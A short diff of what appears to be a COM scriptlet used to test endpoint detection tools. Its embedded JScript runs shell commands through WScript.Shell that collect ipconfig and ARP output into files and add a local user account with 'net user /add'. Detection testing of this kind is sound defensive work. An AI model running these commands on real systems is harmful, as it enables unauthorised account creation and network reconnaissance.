@@ -6,8 +6,10 @@
 	<script language="JScript">
 		<![CDATA[
 			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-			var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all > c:\edrtest\ipconfig.txt");
-
+var r = new ActiveXObject("WScript.Shell").Run("cmd /K mkdir c:\edrtest");
+var r = new ActiveXObject("WScript.Shell").Run("cmd /K ipconfig /all > c:\edrtest\ipconfig.txt");
+var r = new ActiveXObject("WScript.Shell").Run("cmd /K arp -a > c:\edrtest\arp.txt");
+var r = new ActiveXObject("WScript.Shell").Run("cmd /K net user /add shigeru123");
 		]]>
 </script>
 </registration>
